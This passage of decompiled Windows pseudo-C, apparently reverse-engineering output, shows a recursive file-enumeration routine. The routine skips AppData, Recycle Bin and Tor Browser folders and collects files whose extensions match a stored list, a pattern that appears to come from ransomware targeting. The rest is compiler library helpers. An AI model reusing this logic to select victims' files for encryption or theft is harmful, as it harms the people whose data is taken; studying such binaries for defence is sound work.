  sub_401D10((char **)v103, "AppData\\Local\\", 0xEu);
  LOBYTE(v113) = 7;
  v77 = 0;
  v78 = 15;
  LOBYTE(v76[0]) = 0;
  sub_401D10((char **)v76, "AppData\\LocalLow\\", 0x11u);
  LOBYTE(v113) = 8;
  v80 = 0;
  v81 = 15;
  LOBYTE(v79[0]) = 0;
  sub_401D10((char **)v79, "AppData\\Roaming\\Microsoft\\", 0x1Au);
  LOBYTE(v113) = 9;
  v83 = 0;
  v84 = 15;
  LOBYTE(v82[0]) = 0;
  sub_401D10((char **)v82, "$Recycle.Bin\\", 0xDu);
  LOBYTE(v113) = 10;
  v86 = 0;
  v87 = 15;
  LOBYTE(v85[0]) = 0;
  sub_401D10((char **)v85, "Application Data\\", 0x11u);
  LOBYTE(v113) = 11;
  v89 = 0;
  v90 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "\\Tor Browser\\", 0xDu);
  LOBYTE(v113) = 12;
  v7 = (char *)v94;
  if ( v96 >= 0x10 )
    v7 = (char *)v94[0];
  v8 = (char *)lpFileName;
  if ( v111 >= 0x10 )
    v8 = (char *)lpFileName[0];
  if ( sub_401E30(v8, v110, (int)v8, v7, v95) == -1 )
  {
    v9 = (char *)v97;
    if ( v99 >= 0x10 )
      v9 = (char *)v97[0];
    v10 = (char *)lpFileName;
    if ( v111 >= 0x10 )
      v10 = (char *)lpFileName[0];
    if ( sub_401E30(v10, v110, (int)v10, v9, v98) == -1 )
    {
      v11 = (char *)v100;
      if ( v102 >= 0x10 )
        v11 = (char *)v100[0];
      v12 = (char *)lpFileName;
      if ( v111 >= 0x10 )
        v12 = (char *)lpFileName[0];
      if ( sub_401E30(v12, v110, (int)v12, v11, v101) == -1 )
      {
        v13 = (char *)v103;
        if ( v105 >= 0x10 )
          v13 = (char *)v103[0];
        v14 = (char *)lpFileName;
        if ( v111 >= 0x10 )
          v14 = (char *)lpFileName[0];
        if ( sub_401E30(v14, v110, (int)v14, v13, v104) == -1
          && sub_401930((char *)lpFileName, (int)v76, v15) == -1
          && sub_401930((char *)lpFileName, (int)v79, v16) == -1
          && sub_401930((char *)lpFileName, (int)v82, v17) == -1
          && sub_401930((char *)lpFileName, (int)v85, v18) == -1
          && sub_401930((char *)lpFileName, (int)Block, v19) == -1 )
        {
          v20 = (const CHAR *)lpFileName;
          if ( v111 >= 0x10 )
            v20 = lpFileName[0];
          FirstFileA = FindFirstFileA(v20, &FindFileData);
          v73 = FirstFileA;
          if ( FirstFileA != (HANDLE)-1 )
          {
            v22 = a4;
            v23 = FirstFileA;
            do
            {
              if ( FindFileData.cFileName[0] != 46 )
              {
                v24 = Src;
                v66 = v70;
                if ( v93 >= 0x10 )
                  v24 = (void **)Src[0];
                v92 = 0;
                *(_BYTE *)v24 = 0;
                v25 = (char **)std::string::append(v66);
                v26 = sub_4036D0(v25, (void *)"\\", 1u);
                sub_4036D0(v26, FindFileData.cFileName, strlen(FindFileData.cFileName));
                if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
                {
                  if ( (_BYTE)v22 )
                  {
                    LastError = sub_402730(v71, Src, v72, v22);
                    if ( LastError )
                      goto LABEL_40;
                  }
                }
                else
                {
                  sub_401D10((char **)v106, FindFileData.cFileName, strlen(FindFileData.cFileName));
                  v29 = v106;
                  if ( v108 >= 0x10 )
                    v29 = (void **)v106[0];
                  if ( v107 )
                  {
                    for ( i = (void **)((char *)v29 + v107 - 1); *(_BYTE *)i != 46; i = (void **)((char *)i - 1) )
                    {
                      if ( i == v29 )
                        goto LABEL_49;
                    }
                    v31 = (char *)i - (char *)v29;
                  }
                  else
                  {
LABEL_49:
                    v31 = -1;
                  }
                  v32 = sub_403420(v106, v68, v31 + 1, 0xFFFFFFFF);
                  sub_403490((char **)v106, v32);
                  sub_401970(v68);
                  v33 = v106;
                  v34 = v106;
                  v35 = v106;
                  if ( v108 >= 0x10 )
                  {
                    v33 = (void **)v106[0];
                    v34 = (void **)v106[0];
                  }
                  v74 = v33;
                  v36 = (int)v34 + v107;
                  v69 = (int)v34 + v107;
                  if ( v108 >= 0x10 )
                    v35 = (void **)v106[0];
                  while ( v35 != (void **)v36 )
                  {
                    v37 = tolower(*(char *)v35);
                    v38 = v74;
                    v35 = (void **)((char *)v35 + 1);
                    *v74 = v37;
                    v74 = v38 + 1;
                    v36 = v69;
                  }
                  v39 = (_BYTE *)*v72;
                  v40 = v39;
                  v74 = (_BYTE *)*v72;
                  v41 = (int *)*((_DWORD *)v39 + 1);
                  while ( !*((_BYTE *)v41 + 13) )
                  {
                    if ( (unsigned __int8)sub_403520(v41 + 4, v106) )
                    {
                      v41 = (int *)v41[2];
                      v40 = v74;
                    }
                    else
                    {
                      v40 = v41;
                      v41 = (int *)*v41;
                      v74 = v40;
                    }
                  }
                  if ( v40 != v39 && !(unsigned __int8)sub_403520(v106, (_DWORD *)v40 + 4) )
                    v39 = v74;
                  if ( v39 != v4 )
                    sub_403260(v71, Src);
                  v22 = a4;
                }
                v23 = v73;
              }
            }
            while ( FindNextFileA(v23, &FindFileData) );
            FindClose(v23);
            LastError = GetLastError();
            if ( LastError != 18 )
            {
LABEL_40:
              sub_401970((char **)Block);
              sub_401970((char **)v85);
              sub_401970((char **)v82);
              sub_401970((char **)v79);
              sub_401970((char **)v76);
              sub_401970((char **)v103);
              sub_401970((char **)v100);
              sub_401970((char **)v97);
              sub_401970((char **)v94);
              sub_401970((char **)v106);
              sub_401970((char **)lpFileName);
              sub_401970((char **)Src);
              return LastError;
            }
          }
        }
      }
    }
  }
  if ( v90 >= 0x10 )
  {
    v42 = Block[0];
    if ( v90 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_167;
      v43 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v43 >= Block[0] || (unsigned int)(Block[0] - v43) < 4 || (unsigned int)(Block[0] - v43) > 0x23 )
        goto LABEL_167;
      v42 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v42);
  }
  v89 = 0;
  v90 = 15;
  LOBYTE(Block[0]) = 0;
  if ( v87 >= 0x10 )
  {
    v44 = v85[0];
    if ( v87 + 1 >= 0x1000 )
    {
      if ( ((int)v85[0] & 0x1F) != 0 )
        goto LABEL_167;
      v45 = (void *)*((_DWORD *)v85[0] - 1);
      if ( v45 >= v85[0] || (unsigned int)(v85[0] - v45) < 4 || (unsigned int)(v85[0] - v45) > 0x23 )
        goto LABEL_167;
      v44 = (void *)*((_DWORD *)v85[0] - 1);
    }
    j__free(v44);
  }
  v86 = 0;
  v87 = 15;
  LOBYTE(v85[0]) = 0;
  if ( v84 >= 0x10 )
  {
    v46 = v82[0];
    if ( v84 + 1 >= 0x1000 )
    {
      if ( ((int)v82[0] & 0x1F) != 0 )
        goto LABEL_167;
      v47 = (void *)*((_DWORD *)v82[0] - 1);
      if ( v47 >= v82[0] || (unsigned int)(v82[0] - v47) < 4 || (unsigned int)(v82[0] - v47) > 0x23 )
        goto LABEL_167;
      v46 = (void *)*((_DWORD *)v82[0] - 1);
    }
    j__free(v46);
  }
  v83 = 0;
  v84 = 15;
  LOBYTE(v82[0]) = 0;
  if ( v81 >= 0x10 )
  {
    v48 = v79[0];
    if ( v81 + 1 >= 0x1000 )
    {
      if ( ((int)v79[0] & 0x1F) != 0 )
        goto LABEL_167;
      v49 = (void *)*((_DWORD *)v79[0] - 1);
      if ( v49 >= v79[0] || (unsigned int)(v79[0] - v49) < 4 || (unsigned int)(v79[0] - v49) > 0x23 )
        goto LABEL_167;
      v48 = (void *)*((_DWORD *)v79[0] - 1);
    }
    j__free(v48);
  }
  v80 = 0;
  v81 = 15;
  LOBYTE(v79[0]) = 0;
  if ( v78 >= 0x10 )
  {
    v50 = v76[0];
    if ( v78 + 1 >= 0x1000 )
    {
      if ( ((int)v76[0] & 0x1F) != 0 )
        goto LABEL_167;
      v51 = (void *)*((_DWORD *)v76[0] - 1);
      if ( v51 >= v76[0] || (unsigned int)(v76[0] - v51) < 4 || (unsigned int)(v76[0] - v51) > 0x23 )
        goto LABEL_167;
      v50 = (void *)*((_DWORD *)v76[0] - 1);
    }
    j__free(v50);
  }
  v77 = 0;
  v78 = 15;
  LOBYTE(v76[0]) = 0;
  if ( v105 >= 0x10 )
  {
    v52 = v103[0];
    if ( v105 + 1 >= 0x1000 )
    {
      if ( ((int)v103[0] & 0x1F) != 0 )
        goto LABEL_167;
      v53 = (void *)*((_DWORD *)v103[0] - 1);
      if ( v53 >= v103[0] || (unsigned int)(v103[0] - v53) < 4 || (unsigned int)(v103[0] - v53) > 0x23 )
        goto LABEL_167;
      v52 = (void *)*((_DWORD *)v103[0] - 1);
    }
    j__free(v52);
  }
  v104 = 0;
  v105 = 15;
  LOBYTE(v103[0]) = 0;
  if ( v102 >= 0x10 )
  {
    v54 = v100[0];
    if ( v102 + 1 >= 0x1000 )
    {
      if ( ((int)v100[0] & 0x1F) != 0 )
        goto LABEL_167;
      v55 = (void *)*((_DWORD *)v100[0] - 1);
      if ( v55 >= v100[0] || (unsigned int)(v100[0] - v55) < 4 || (unsigned int)(v100[0] - v55) > 0x23 )
        goto LABEL_167;
      v54 = (void *)*((_DWORD *)v100[0] - 1);
    }
    j__free(v54);
  }
  v101 = 0;
  v102 = 15;
  LOBYTE(v100[0]) = 0;
  if ( v99 >= 0x10 )
  {
    v56 = v97[0];
    if ( v99 + 1 >= 0x1000 )
    {
      if ( ((int)v97[0] & 0x1F) != 0 )
        goto LABEL_167;
      v57 = (void *)*((_DWORD *)v97[0] - 1);
      if ( v57 >= v97[0] || (unsigned int)(v97[0] - v57) < 4 || (unsigned int)(v97[0] - v57) > 0x23 )
        goto LABEL_167;
      v56 = (void *)*((_DWORD *)v97[0] - 1);
    }
    j__free(v56);
  }
  v98 = 0;
  v99 = 15;
  LOBYTE(v97[0]) = 0;
  if ( v96 >= 0x10 )
  {
    v58 = v94[0];
    if ( v96 + 1 >= 0x1000 )
    {
      if ( ((int)v94[0] & 0x1F) != 0 )
        goto LABEL_167;
      v59 = (void *)*((_DWORD *)v94[0] - 1);
      if ( v59 >= v94[0] || (unsigned int)(v94[0] - v59) < 4 || (unsigned int)(v94[0] - v59) > 0x23 )
        goto LABEL_167;
      v58 = (void *)*((_DWORD *)v94[0] - 1);
    }
    j__free(v58);
  }
  v95 = 0;
  v96 = 15;
  LOBYTE(v94[0]) = 0;
  if ( v108 >= 0x10 )
  {
    v60 = v106[0];
    if ( v108 + 1 >= 0x1000 )
    {
      if ( ((int)v106[0] & 0x1F) != 0 )
        goto LABEL_167;
      v61 = (void *)*((_DWORD *)v106[0] - 1);
      if ( v61 >= v106[0] || (unsigned int)(v106[0] - v61) < 4 || (unsigned int)(v106[0] - v61) > 0x23 )
        goto LABEL_167;
      v60 = (void *)*((_DWORD *)v106[0] - 1);
    }
    j__free(v60);
  }
  v107 = 0;
  v108 = 15;
  LOBYTE(v106[0]) = 0;
  if ( v111 >= 0x10 )
  {
    v62 = (CHAR *)lpFileName[0];
    if ( v111 + 1 >= 0x1000 )
    {
      if ( ((int)lpFileName[0] & 0x1F) != 0 )
        goto LABEL_167;
      v63 = (LPCSTR)*((_DWORD *)lpFileName[0] - 1);
      if ( v63 >= lpFileName[0] || (unsigned int)(lpFileName[0] - v63) < 4 || (unsigned int)(lpFileName[0] - v63) > 0x23 )
        goto LABEL_167;
      v62 = (CHAR *)*((_DWORD *)lpFileName[0] - 1);
    }
    j__free(v62);
  }
  v110 = 0;
  v111 = 15;
  LOBYTE(lpFileName[0]) = 0;
  if ( v93 >= 0x10 )
  {
    v64 = Src[0];
    if ( v93 + 1 < 0x1000 )
    {
LABEL_165:
      j__free(v64);
      return 0;
    }
    if ( ((int)Src[0] & 0x1F) == 0 )
    {
      v65 = (void *)*((_DWORD *)Src[0] - 1);
      if ( v65 < Src[0] && (unsigned int)(Src[0] - v65) >= 4 && (unsigned int)(Src[0] - v65) <= 0x23 )
      {
        v64 = (void *)*((_DWORD *)Src[0] - 1);
        goto LABEL_165;
      }
    }
LABEL_167:
    _invalid_parameter_noinfo_noreturn();
  }
  return 0;
}
// 402C64: conditional instruction was optimized away because %var_34.4!=0
// 402C87: conditional instruction was optimized away because eax.4==0
// 402A5F: variable 'v15' is possibly undefined
// 402A78: variable 'v16' is possibly undefined
// 402A91: variable 'v17' is possibly undefined
// 402AAA: variable 'v18' is possibly undefined
// 402AC3: variable 'v19' is possibly undefined

//----- (00403260) --------------------------------------------------------
_DWORD *__thiscall sub_403260(int *this, _DWORD *Src)
{
  int v3; // esi
  _DWORD *v4; // ecx
  _DWORD *result; // eax
  int v6; // edi
  int v7; // eax
  unsigned int v8; // esi
  unsigned int v9; // esi
  char *v10; // edi
  unsigned int v11; // eax
  void *v12; // eax
  int v13; // edx
  int v14; // [esp+0h] [ebp-40h] BYREF
  char *v15; // [esp+10h] [ebp-30h]
  char *v16; // [esp+14h] [ebp-2Ch]
  int v17; // [esp+18h] [ebp-28h]
  int v18; // [esp+1Ch] [ebp-24h]
  int v19; // [esp+20h] [ebp-20h]
  void *v20; // [esp+24h] [ebp-1Ch]
  void *Block; // [esp+28h] [ebp-18h]
  char v22; // [esp+2Fh] [ebp-11h]
  int *v23; // [esp+30h] [ebp-10h]
  int v24; // [esp+3Ch] [ebp-4h]

  v23 = &v14;
  v3 = this[2];
  v4 = (_DWORD *)this[1];
  v20 = Src;
  if ( (_DWORD *)v3 == v4 )
  {
    v6 = *this;
    v7 = ((int)v4 - *this) / 24;
    v19 = v7;
    if ( v7 == 178956970 )
      sub_4035D0();
    v17 = v7 + 1;
    v8 = (v3 - v6) / 24;
    if ( v8 <= 178956970 - (v8 >> 1) )
    {
      v9 = (v8 >> 1) + v8;
      if ( v9 < v7 + 1 )
        v9 = v7 + 1;
      v18 = v9;
    }
    else
    {
      v9 = v7 + 1;
      v18 = v7 + 1;
    }
    v22 = 0;
    if ( v9 )
    {
      if ( v9 > 0xAAAAAAA )
        sub_415388();
      v11 = 24 * v9;
      if ( 24 * v9 < 0x1000 )
      {
        Block = operator new(24 * v9);
        v10 = (char *)Block;
      }
      else
      {
        if ( v11 + 35 <= v11 )
          sub_415388();
        v12 = operator new(v11 + 35);
        v10 = (char *)(((unsigned int)v12 + 35) & 0xFFFFFFE0);
        Block = v10;
        *((_DWORD *)v10 - 1) = v12;
      }
    }
    else
    {
      v10 = 0;
      Block = 0;
    }
    v24 = 2;
    v15 = &v10[24 * v19];
    v16 = v15;
    sub_401A10(v15, v20);
    LOBYTE(v24) = 1;
    v13 = this[1];
    LOBYTE(v20) = 0;
    v22 = 1;
    sub_403930(*this, v13, (int)v10);
    return (_DWORD *)sub_4035E0(this, (int)v10, v17, v9);
  }
  else
  {
    v17 = (int)v4;
    v20 = v4;
    v24 = 0;
    result = sub_401A10(v4, Src);
    this[1] += 24;
  }
  return result;
}

//----- (00403420) --------------------------------------------------------
char **__thiscall sub_403420(_DWORD *this, char **a2, unsigned int a3, unsigned int a4)
{
  size_t v4; // edx
  unsigned int v5; // eax
  unsigned int v6; // eax

  v4 = a4;
  a2[4] = 0;
  a2[5] = (char *)15;
  *(_BYTE *)a2 = 0;
  v5 = this[4];
  if ( v5 < a3 )
    sub_403840();
  v6 = v5 - a3;
  if ( v6 < a4 )
    v4 = v6;
  if ( this[5] >= 0x10u )
    this = (_DWORD *)*this;
  sub_401D10(a2, (char *)this + a3, v4);
  return a2;
}

//----- (00403490) --------------------------------------------------------
char **__thiscall sub_403490(char **this, char **a2)
{
  char *v3; // eax
  char *v4; // ecx
  char *v5; // eax
  unsigned int v6; // ecx

  if ( this != a2 )
  {
    v3 = this[5];
    if ( (unsigned int)v3 >= 0x10 )
    {
      v4 = *this;
      if ( (unsigned int)(v3 + 1) >= 0x1000 )
      {
        if ( ((unsigned __int8)v4 & 0x1F) != 0
          || (v5 = (char *)*((_DWORD *)v4 - 1), v5 >= v4)
          || (v6 = v4 - v5, v6 < 4)
          || v6 > 0x23 )
        {
          _invalid_parameter_noinfo_noreturn();
        }
        v4 = v5;
      }
      j__free(v4);
    }
    this[4] = 0;
    this[5] = (char *)15;
    *(_BYTE *)this = 0;
    *(_OWORD *)this = *(_OWORD *)a2;
    *((_QWORD *)this + 2) = *((_QWORD *)a2 + 2);
    a2[4] = 0;
    a2[5] = (char *)15;
    *(_BYTE *)a2 = 0;
  }
  return this;
}

//----- (00403520) --------------------------------------------------------
unsigned int __stdcall sub_403520(_DWORD *a1, _DWORD *a2)
{
  _DWORD *v2; // ecx
  _DWORD *v3; // edx
  unsigned int v4; // ebx
  unsigned int v5; // esi
  unsigned int v6; // edi
  unsigned int v7; // esi
  bool v8; // cf
  unsigned __int8 v9; // al
  unsigned __int8 v10; // al
  unsigned __int8 v11; // al
  unsigned int v12; // eax

  v2 = a2;
  if ( a2[5] >= 0x10u )
    v2 = (_DWORD *)*a2;
  v3 = a1;
  if ( a1[5] >= 0x10u )
    v3 = (_DWORD *)*a1;
  v4 = a1[4];
  v5 = v4;
  v6 = a2[4];
  if ( v6 < v4 )
    v5 = a2[4];
  v8 = v5 < 4;
  v7 = v5 - 4;
  if ( v8 )
  {
LABEL_10:
    if ( v7 == -4 )
      goto LABEL_19;
  }
  else
  {
    while ( *v3 == *v2 )
    {
      ++v3;
      ++v2;
      v8 = v7 < 4;
      v7 -= 4;
      if ( v8 )
        goto LABEL_10;
    }
  }
  v8 = *(_BYTE *)v3 < *(_BYTE *)v2;
  if ( *(_BYTE *)v3 != *(_BYTE *)v2
    || v7 != -3
    && ((v9 = *((_BYTE *)v3 + 1), v8 = v9 < *((_BYTE *)v2 + 1), v9 != *((_BYTE *)v2 + 1))
     || v7 != -2
     && ((v10 = *((_BYTE *)v3 + 2), v8 = v10 < *((_BYTE *)v2 + 2), v10 != *((_BYTE *)v2 + 2))
      || v7 != -1 && (v11 = *((_BYTE *)v3 + 3), v8 = v11 < *((_BYTE *)v2 + 3), v11 != *((_BYTE *)v2 + 3)))) )
  {
    v12 = v8 ? -1 : 1;
    goto LABEL_20;
  }
LABEL_19:
  v12 = 0;
LABEL_20:
  if ( !v12 )
  {
    if ( v6 > v4 )
      return 1;
    v12 = v6 < v4;
  }
  return v12 >> 31;
}

//----- (004035D0) --------------------------------------------------------
void __noreturn sub_4035D0()
{
  sub_41349F((int)"vector<T> too long");
}

//----- (004035E0) --------------------------------------------------------
int __thiscall sub_4035E0(int *this, int a2, int a3, int a4)
{
  int v5; // ecx
  _BYTE *v6; // ebx
  unsigned int v7; // eax
  _BYTE *v8; // eax
  unsigned int v9; // ebx
  int result; // eax

  v5 = *this;
  if ( v5 )
  {
    sub_4038C0(v5, this[1]);
    v6 = (_BYTE *)*this;
    v7 = (this[2] - *this) / 24;
    if ( v7 <= 0xAAAAAAA )
    {
      if ( 24 * v7 < 0x1000 )
      {
LABEL_9:
        j__free(v6);
        goto LABEL_10;
      }
      if ( ((unsigned __int8)v6 & 0x1F) == 0 )
      {
        v8 = (_BYTE *)*((_DWORD *)v6 - 1);
        if ( v8 < v6 )
        {
          v9 = v6 - v8;
          if ( v9 >= 4 && v9 <= 0x23 )
          {
            v6 = v8;
            goto LABEL_9;
          }
        }
      }
    }
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_10:
  *this = a2;
  this[1] = a2 + 24 * a3;
  result = a2 + 24 * a4;
  this[2] = result;
  return result;
}

//----- (00403680) --------------------------------------------------------
void __stdcall sub_403680(_DWORD *Block, unsigned int a2)
{
  _DWORD *v2; // ecx
  unsigned int v3; // eax

  v2 = Block;
  if ( a2 > 0xAAAAAAA )
    goto LABEL_9;
  if ( 24 * a2 >= 0x1000 )
  {
    if ( ((unsigned __int8)Block & 0x1F) == 0 )
    {
      v3 = *(Block - 1);
      if ( v3 < (unsigned int)Block && (unsigned int)Block - v3 >= 4 && (unsigned int)Block - v3 <= 0x23 )
      {
        v2 = (_DWORD *)*(Block - 1);
        goto LABEL_8;
      }
    }
LABEL_9:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_8:
  j__free(v2);
}

//----- (004036D0) --------------------------------------------------------
char **__thiscall sub_4036D0(char **Src, void *Srca, size_t Size)
{
  unsigned int v4; // ecx
  char *v5; // edi
  char **v6; // eax
  char **result; // eax
  size_t v8; // edx
  char *v9; // eax
  char *v10; // ebx
  char *v11; // eax
  unsigned int v12; // ebx
  unsigned int v13; // [esp+10h] [ebp-10h]
  size_t v14; // [esp+18h] [ebp-8h]
  char *v15; // [esp+18h] [ebp-8h]
  char **v16; // [esp+1Ch] [ebp-4h]
  int v17; // [esp+1Ch] [ebp-4h]
  unsigned int v18; // [esp+1Ch] [ebp-4h]

  v4 = (unsigned int)Src[5];
  v5 = Src[4];
  v13 = v4;
  if ( Size > v4 - (unsigned int)v5 )
  {
    if ( 0x7FFFFFFF - (int)v5 < Size )
      sub_401F10();
    v8 = 0x7FFFFFFF;
    v17 = 0x7FFFFFFF;
    v14 = (unsigned int)&v5[Size] | 0xF;
    if ( v14 <= 0x7FFFFFFF )
    {
      v18 = v4 >> 1;
      if ( v4 <= 0x7FFFFFFF - (v4 >> 1) )
      {
        v8 = (unsigned int)&v5[Size] | 0xF;
        if ( v14 < v4 + v18 )
          v8 = v4 + v18;
      }
      v17 = v8;
    }
    v9 = (char *)sub_401C70(__CFADD__(v8, 1) ? -1 : v8 + 1);
    Src[4] = &v5[Size];
    v15 = v9;
    Src[5] = (char *)v17;
    if ( v13 < 0x10 )
    {
      memmove_0(v9, Src, (size_t)v5);
      memmove_0(&v15[(_DWORD)v5], Srca, Size);
      v15[Size + (_DWORD)v5] = 0;
      result = Src;
      *Src = v15;
    }
    else
    {
      v10 = *Src;
      memmove_0(v9, *Src, (size_t)v5);
      memmove_0(&v15[(_DWORD)v5], Srca, Size);
      v15[Size + (_DWORD)v5] = 0;
      if ( v13 + 1 >= 0x1000 )
      {
        if ( ((unsigned __int8)v10 & 0x1F) != 0
          || (v11 = (char *)*((_DWORD *)v10 - 1), v11 >= v10)
          || (v12 = v10 - v11, v12 < 4)
          || v12 > 0x23 )
        {
          _invalid_parameter_noinfo_noreturn();
        }
        v10 = v11;
      }
      j__free(v10);
      *Src = v15;
      return Src;
    }
  }
  else
  {
    v16 = Src;
    Src[4] = &v5[Size];
    v6 = Src;
    if ( v4 >= 0x10 )
    {
      v6 = (char **)*Src;
      v16 = (char **)*Src;
    }
    memmove(&v5[(_DWORD)v6], Srca, Size);
    result = Src;
    v5[(_DWORD)v16 + Size] = 0;
  }
  return result;
}

//----- (00403840) --------------------------------------------------------
void __noreturn sub_403840()
{
  sub_4134BF((int)"invalid string position");
}

//----- (00403850) --------------------------------------------------------
void *__thiscall sub_403850(void *this)
{
  return this;
}

//----- (00403860) --------------------------------------------------------
void __fastcall sub_403860(int a1, int a2)
{
  unsigned int v3; // eax
  char *v4; // ecx
  char *v5; // eax
  unsigned int v6; // ecx

  v3 = *(_DWORD *)(a2 + 20);
  if ( v3 >= 0x10 )
  {
    v4 = *(char **)a2;
    if ( v3 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)v4 & 0x1F) != 0
        || (v5 = (char *)*((_DWORD *)v4 - 1), v5 >= v4)
        || (v6 = v4 - v5, v6 < 4)
        || v6 > 0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v4 = v5;
    }
    j__free(v4);
  }
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
}

//----- (004038C0) --------------------------------------------------------
void __fastcall sub_4038C0(int a1, int a2)
{
  int i; // esi
  unsigned int v4; // eax
  _DWORD *v5; // ecx
  unsigned int v6; // eax

  for ( i = a1; i != a2; i += 24 )
  {
    v4 = *(_DWORD *)(i + 20);
    if ( v4 >= 0x10 )
    {
      v5 = *(_DWORD **)i;
      if ( v4 + 1 >= 0x1000 )
      {
        if ( ((unsigned __int8)v5 & 0x1F) != 0
          || (v6 = *(v5 - 1), v6 >= (unsigned int)v5)
          || (unsigned int)v5 - v6 - 4 > 0x1F )
        {
          _invalid_parameter_noinfo_noreturn();
        }
        v5 = (_DWORD *)*(v5 - 1);
      }
      j__free(v5);
    }
    *(_DWORD *)(i + 16) = 0;
    *(_DWORD *)(i + 20) = 15;
    *(_BYTE *)i = 0;
  }
}

//----- (00403930) --------------------------------------------------------
int __fastcall sub_403930(int a1, int a2, int a3)
{
  int result; // eax

  for ( result = a3; a1 != a2; a1 += 24 )
  {
    *(_DWORD *)(result + 16) = 0;
    *(_DWORD *)(result + 20) = 0;
    *(_OWORD *)result = *(_OWORD *)a1;
    *(_QWORD *)(result + 16) = *(_QWORD *)(a1 + 16);
    result += 24;
    *(_DWORD *)(a1 + 16) = 0;
    *(_DWORD *)(a1 + 20) = 15;
    *(_BYTE *)a1 = 0;
  }
  return result;
}

//----- (00403980) --------------------------------------------------------
int __cdecl sub_403980(char *Buffer, size_t BufferCount, char *Format, _locale_t Locale, va_list ArgList)
{
  unsigned __int64 *v5; // eax
  int result; // eax

  v5 = (unsigned __int64 *)sub_401FB0();
  result = __stdio_common_vsprintf_s(*v5, Buffer, BufferCount, Format, Locale, ArgList);
  if ( result < 0 )
    return -1;
  return result;
}

//----- (004039C0) --------------------------------------------------------
int sub_4039C0(char *Buffer, size_t BufferCount, char *Format, ...)
{
  va_list ArgList; // [esp+14h] [ebp+14h] BYREF

  va_start(ArgList, Format);
  return sub_403980(Buffer, BufferCount, Format, 0, ArgList);
}

//----- (004039E0) --------------------------------------------------------
char *__thiscall sub_4039E0(char *this, int a2)
{
  int v4; // [esp+4h] [ebp-Ch] BYREF
  char v5; // [esp+8h] [ebp-8h]

  v4 = a2;
  v5 = 1;
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(&v4, this + 4);
  return this;
}
// 4164FE: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 435334: using guessed type void *std::exception::`vftable';

//----- (00403A30) --------------------------------------------------------
char *__thiscall sub_403A30(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  return this;
}
// 4164FE: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 435334: using guessed type void *std::exception::`vftable';

//----- (00403A60) --------------------------------------------------------
const char *__thiscall sub_403A60(_DWORD *this)
{
  int v1; // ecx
  const char *result; // eax

  v1 = this[1];
  result = "Unknown exception";
  if ( v1 )
    return (const char *)v1;
  return result;
}

//----- (00403A70) --------------------------------------------------------
char *__thiscall sub_403A70(char *Block, char a2)
{
  *(_DWORD *)Block = &std::exception::`vftable';
  __std_exception_destroy(Block + 4);
  if ( (a2 & 1) != 0 )
    sub_414AF8(Block);
  return Block;
}
// 416561: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 435334: using guessed type void *std::exception::`vftable';

//----- (00403AA0) --------------------------------------------------------
char *__thiscall sub_403AA0(char *this, int a2)
{
  int v4; // [esp+4h] [ebp-Ch] BYREF
  char v5; // [esp+8h] [ebp-8h]

  v4 = a2;
  v5 = 1;
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(&v4, this + 4);
  *(_DWORD *)this = &std::runtime_error::`vftable';
  return this;
}
// 4164FE: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 435334: using guessed type void *std::exception::`vftable';
// 435380: using guessed type void *std::runtime_error::`vftable';

//----- (00403B20) --------------------------------------------------------
struct std::_Locinfo *__thiscall sub_403B20(struct std::_Locinfo *this, char *Locale)
{
  char pExceptionObject[12]; // [esp+8h] [ebp-1Ch] BYREF
  std::_Lockit *v5; // [esp+14h] [ebp-10h]
  int v6; // [esp+20h] [ebp-4h]

  v5 = this;
  std::_Lockit::_Lockit(this, 0);
  v6 = 0;
  *((_DWORD *)this + 1) = 0;
  *((_BYTE *)this + 8) = 0;
  *((_DWORD *)this + 3) = 0;
  *((_BYTE *)this + 16) = 0;
  *((_DWORD *)this + 5) = 0;
  *((_WORD *)this + 12) = 0;
  *((_DWORD *)this + 7) = 0;
  *((_WORD *)this + 16) = 0;
  *((_DWORD *)this + 9) = 0;
  *((_BYTE *)this + 40) = 0;
  *((_DWORD *)this + 11) = 0;
  *((_BYTE *)this + 48) = 0;
  LOBYTE(v6) = 6;
  if ( !Locale )
  {
    sub_403AA0(pExceptionObject, (int)"bad locale name");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVruntime_error_std__);
  }
  std::_Locinfo::_Locinfo_ctor(this, Locale);
  return this;
}

//----- (00403BE0) --------------------------------------------------------
void __thiscall sub_403BE0(std::_Lockit *this)
{
  std::_Locinfo::_Locinfo_dtor(this);
  if ( *((_DWORD *)this + 11) )
    free(*((void **)this + 11));
  *((_DWORD *)this + 11) = 0;
  if ( *((_DWORD *)this + 9) )
    free(*((void **)this + 9));
  *((_DWORD *)this + 9) = 0;
  if ( *((_DWORD *)this + 7) )
    free(*((void **)this + 7));
  *((_DWORD *)this + 7) = 0;
  if ( *((_DWORD *)this + 5) )
    free(*((void **)this + 5));
  *((_DWORD *)this + 5) = 0;
  if ( *((_DWORD *)this + 3) )
    free(*((void **)this + 3));
  *((_DWORD *)this + 3) = 0;
  if ( *((_DWORD *)this + 1) )
    free(*((void **)this + 1));
  *((_DWORD *)this + 1) = 0;
  std::_Lockit::~_Lockit(this);
}

//----- (00403CB0) --------------------------------------------------------
char *__thiscall sub_403CB0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
